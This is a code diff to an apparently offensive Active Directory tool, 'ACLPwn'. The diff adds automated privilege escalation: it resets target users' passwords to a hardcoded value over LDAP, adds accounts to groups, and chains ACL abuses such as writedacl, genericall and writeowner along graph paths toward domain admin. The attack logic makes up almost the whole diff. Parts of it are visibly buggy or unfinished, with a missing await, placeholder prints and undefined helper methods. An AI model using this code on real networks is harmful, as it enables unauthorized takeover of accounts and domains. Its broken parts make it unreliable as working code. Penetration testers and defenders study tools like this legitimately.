@@ -4,6 +4,8 @@ import traceback
 import pprint
 
 import aiohttp
+from msldap.commons.url import MSLDAPURLDecoder
+from aiosmb.commons.connection.url import SMBConnectionURL
 
 
 class ACLPwn:
@@ -15,8 +17,17 @@ class ACLPwn:
 		self.start_user_sid = start_user_sid
 		self.domainsids = []
 		self.dagroups = []
+		self.newpass = 'Passw0rd!1'
+		self.objcache = {}
+		self.current_user = None
 
 		self.is_graph_loaded = False
+
+	def get_ldap(self):
+		return MSLDAPURLDecoder(self.ldap_url)
+
+	def get_smb(self):
+		return SMBConnectionURL(self.smb_url)
 
 	async def load_graph(self):
 		try:
@@ -83,10 +94,99 @@ class ACLPwn:
 			return True, None
 		except Exception as e:
 			return False, e
+
+	async def get_objinfo(self, sid, stype):
+		try:
+			if sid not in self.objcache:
+				#http://127.0.0.1:5000/group/1/by_sid/S-1-5-21-4136613964-2812260436-2179565534-2643
+				async with aiohttp.ClientSession() as session:
+					async with session.get('%s/%s/%s/by_sid/%s' % (self.jd_url, stype, self.graph_id, sid)) as resp:
+						print(resp.status)
+						if resp.status != 200:
+							raise Exception('Loading graphid failed! Status: %s' % resp.status)
+						body = await resp.text()
+						print(body)
+						self.objcache[sid] = json.loads(body)
+			
+			return self.objcache[sid], None
+		except Exception as e:
+			return False, e
+
+	async def get_dn(self, sid, stype, ad_id):
+		try:
+			userinfo, err = await self.get_objinfo(sid, stype)
+			if err is not None:
+				raise err
+			
+			if 'dn' in userinfo:
+				return userinfo['dn'], None
+			if 'distinguishedName' in userinfo:
+				return userinfo['distinguishedName'], None
+
+		except Exception as e:
+			return False, e
+
+	async def change_user(self, sid, ad_id = 1):
+		try:
+			print('Changing user...')
+			if sid not in self.objcache:
+				_, err = self.get_objinfo(sid, 'user')
+				if err is not None:
+					raise err
+			self.current_user = self.objcache[sid]['sAMAccountName']
+
+		except Exception as e:
+			return False, e
 	
-	async def changepw_user(self):
-		#password reset
-		pass
+	async def changepw_user(self, src_sid, dst_sid, ad_id = 1):
+		try:
+			
+			user_dn, err = await self.get_dn(dst_sid, 'user', ad_id)
+			if err is not None:
+				raise err
+
+			ldapclient = self.get_ldap().get_client()
+			print('Changing user %s \'s password to %s' % (user_dn, self.newpass))
+			_, err = await ldapclient.connect()
+			if err is not None:
+				raise err
+			
+			_, err = await ldapclient.change_password(user_dn, self.newpass)
+			if err is not None:
+				raise err
+			
+			print('User password changed!')
+
+		except Exception as e:
+			print('Failed to change password for user %s' % user_dn)
+			return False, e
+	
+	async def add_user_to_group(self, src_sid, dst_sid, ad_id = 1):
+		try:
+			
+			user_dn, err = await self.get_dn(src_sid, 'user', ad_id)
+			if err is not None:
+				raise err
+			
+			group_dn, err = await self.get_dn(dst_sid, 'group', ad_id)
+			if err is not None:
+				raise err
+
+			ldapclient = self.get_ldap().get_client()
+			print('Adding user %s \'s to group %s' % (user_dn, group_dn))
+			_, err = await ldapclient.connect()
+			if err is not None:
+				raise err
+			
+			_, err = await ldapclient.add_user_to_group(user_dn, group_dn)
+			if err is not None:
+				raise err
+			
+			print('User password changed!')
+
+		except Exception as e:
+			print('Failed to add user %s to group %s' % (user_dn, group_dn))
+			return False, e
 	
 	async def genericall_user(self):
 		#password reset
@@ -120,20 +220,110 @@ class ACLPwn:
 
 	async def build_chain(self, paths):
 		try:
+			# breaking up the path to individual steps, filtering the ones which are feasible, and selecting one
+			# TODO: some improvement on the selection rpcess
 			print('build_chain')
 			print()
 			paths = sorted(paths, key=len) #favouring shorter paths
+			links = []
 			for path in paths:
-				curr_user = path[0]
-				print(curr_user)
-				i = 1
-				while i < len(path)-1:
-					if path[i] == 'member':
+				print('<<<<<<<<<<<<< NEXT >>>>>>>>>>>>>>>>>>>>>>>')
+				print(path)
+				i = 0
+				link = []
+				while i < len(path):
+					if path[i+1] != 'member':
+						link.append((path[i], path[i+1], path[i+2]))
+						print((path[i], path[i+1], path[i+2]))
 						i += 2
-						continue
 					else:
-						print('label: %s' % path[i])
-						i += 1
+						if len(path[i:]) >= 4:
+							link.append((path[i], path[i+3], path[i+4]))
+							print((path[i], path[i+3], path[i+4]))
+						i += 4
+
+				links.append(link)
+			
+			print('Processing links')
+			print(len(links))
+			selected_actions = None
+			for link in links:
+				if selected_actions is not None:
+					break
+				actions = []
+				for action in link:
+					src_sid = action[0][0]
+					src_type = action[0][1]
+					atype = action[1].lower()
+					dst_sid = action[2][0]
+					dst_type = action[2][1]
+					
+					if atype == 'user-force-change-password':
+						if dst_type == 'user':
+							actions.append(self.changepw_user(src_sid, dst_sid))
+							actions.append(self.change_user(dst_sid))
+						else:
+							print('Action %s not supported on %s' % (atype, dst_type))
+							break 
+
+					elif atype in ['addmember', 'extendedrightall']:
+						if dst_type == 'group':
+							actions.append(self.add_user_to_group(src_sid, dst_sid))
+						else:
+							print('Action %s not supported on %s' % (atype, dst_type))
+							break 
+					
+					elif atype in ['dcsync', 'getchangesall']:
+						continue
+					
+					elif atype in ['writedacl', 'genericall', 'genericwrite', 'owns']:
+						if dst_type == 'group':
+							if atype in ['writedacl', 'owns']:
+								#add_addmember_privs
+								#actions.append(self.add_user_to_group(src_sid, dst_sid))
+								print('1111111111111111')
+							actions.append(self.add_user_to_group(src_sid, dst_sid))
+						
+						elif dst_type == 'domain':
+							print('22222222222222')
+							#actions.append(self.add_user_to_group(src_sid, dst_sid))
+
+						else:
+							print('Action %s not supported on %s' % (atype, dst_type))
+							break
+
+					elif atype == 'writeowner':
+						if dst_type == 'group':
+							actions.append(self.write_owner(src_sid, dst_sid))
+							actions.append(self.add_addmember_privs(src_sid, dst_sid))
+							actions.append(self.add_user_to_group(src_sid, dst_sid))
+
+						elif dst_type == 'domain':
+							print('22222222222222')
+							#actions.append(self.write_owner(src_sid, dst_sid))
+							#actions.append(self.add_domain_sync(src_sid, dst_sid))
+							#
+
+						else:
+							print('Action %s not supported on %s' % (atype, dst_type))
+							break
+
+					
+	
+				else:
+					selected_actions = actions
+
+			if selected_actions is None:
+				raise Exception('No action found which would yield domain admin rights.')
+			
+			for action in actions:
+				_, err = await action
+				if err is not None:
+					raise err
+			
+			print('Actions succeeded we should be DA now!')
+
+
 
 			
 			return True, None
